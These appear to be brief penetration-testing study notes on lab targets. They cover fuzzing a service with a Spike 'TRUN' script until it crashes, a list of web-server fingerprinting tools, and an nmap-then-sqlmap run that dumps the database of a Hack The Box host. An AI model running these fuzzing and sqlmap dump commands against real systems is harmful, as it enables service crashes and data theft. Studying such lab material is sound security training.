# Fuzzing with Spike

`nc 10.0.2.14 9999`
`HELP`
```command.spk
s_readline();
s_string("TRUN ");
s_string_variable("COMMAND");
```

`generic_send_tcp 10.0.2.14 9999 command.spk 0 0`
--> Server crashed
# Information gathering with Legion 

# Fingerprint web servers

#### httprecon
#### httprint
#### uniscan

# web server penetration using sqlmap

1. `nmap -PS -F -A 10.10.10.22`
\> ssl-cert: commonName=europacorp.htb 
\> DNS: **admin-portal.europacorp.htb** (name server)
2. `nano /etc/hosts`
3. append `10.10.10.22 admin-portal.europacorp.htb`
4. On Firefox: `https://admin-portal.europacorp.htb`
5. `sqlmap -u https://admin-portal.europacorp.htb --forms --crawl=2 --dump`